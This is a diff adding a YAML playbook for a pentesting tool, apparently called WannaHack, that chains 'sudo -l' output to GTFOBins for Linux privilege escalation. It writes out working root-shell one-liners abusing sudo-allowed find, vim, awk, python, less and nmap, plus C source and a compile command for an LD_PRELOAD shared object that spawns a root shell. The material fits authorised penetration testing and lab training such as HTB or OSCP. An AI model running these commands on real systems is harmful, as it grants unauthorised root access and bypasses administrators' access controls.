@@ -1,0 +1,69 @@
+id: sudo-gtfobins-escalation
+name: "Linux PE — sudo allowed binary → GTFOBins → root"
+description: >
+  `sudo -l` returned a list. For each binary the user can sudo, GTFOBins
+  has a one-liner that spawns a root shell or reads /etc/shadow. This
+  chain bridges them.
+tags: [linux, priv-esc, sudo, gtfobins]
+difficulty: easy
+
+inputs:
+  - name: sudo_allowed
+    description: "From the linux-priv-esc-recon chain (or run sudo -l yourself)."
+
+steps:
+  - id: list_sudo
+    name: "Re-list sudo allowances (in case it expired)"
+    inline_command: "sudo -l"
+
+  - id: open_gtfo_search
+    name: "Look the binary up in WannaHack's GTFOBins library"
+    inline_command: "echo 'In WannaHack: switch to Commands mode, filter by \"gtfobins\", search for the binary name. Pick the sudo variant.'"
+    notes: |
+      The GTFOBins KB sync gives every binary its own command entry under
+      commands/gtfobins/. Click Copy in the card and run it as the sudoers
+      line allows.
+
+  - id: typical_examples
+    name: "Common quickwins (try these first)"
+    inline_command: |
+      # find
+      sudo find . -exec /bin/sh \; -quit
+      # vim
+      sudo vim -c ':!/bin/sh'
+      # nmap (interactive mode, old)
+      sudo nmap --interactive
+      # less / more / man
+      sudo less /etc/profile  # then `!sh`
+      # python
+      sudo python -c 'import os; os.system("/bin/sh")'
+      # awk
+      sudo awk 'BEGIN {system("/bin/sh")}'
+    notes: |
+      90% of HTB/OSCP sudo abuses land on one of these. If yours isn't
+      here, hit GTFOBins.
+
+  - id: env_keep_check
+    name: "Check env_keep tricks (LD_PRELOAD / PYTHONPATH)"
+    inline_command: "sudo -l | grep env_keep"
+    notes: |
+      `env_keep+=LD_PRELOAD` → compile a tiny .so that execve's /bin/sh,
+      `sudo LD_PRELOAD=/tmp/x.so <any_allowed_program>`.
+      Sample .so:
+        #include <stdio.h>
+        #include <stdlib.h>
+        #include <unistd.h>
+        void _init() { unsetenv("LD_PRELOAD"); setuid(0); execve("/bin/sh", NULL, NULL); }
+      Compile: gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c
+
+  - id: confirm_root
+    name: "Confirm root"
+    inline_command: "id"
+    notes: |
+      Expected: `uid=0(root) gid=0(root) groups=0(root)`.
+
+references:
+  - title: "GTFOBins"
+    url:   "https://gtfobins.github.io/"
+  - title: "Sudo env_keep abuse"
+    url:   "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload"
